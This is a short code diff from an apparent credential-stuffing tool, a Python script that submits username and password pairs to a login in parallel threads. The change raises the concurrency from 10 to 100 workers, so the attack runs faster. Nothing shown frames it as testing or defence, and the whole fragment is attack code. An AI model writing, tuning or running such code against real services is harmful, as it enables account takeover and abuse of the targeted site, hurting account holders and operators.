@@ -28,7 +28,7 @@ def attempt_login(username, password):
         print(f"Error with request for {username}:{password}: {e}")
 
 def run_credential_stuffing():
-    with ThreadPoolExecutor(max_workers=10) as executor:  
+    with ThreadPoolExecutor(max_workers=100) as executor:  
         futures = []
         for username, password in credentials:
             print(f"Trying Username: {username} Password: {password}")
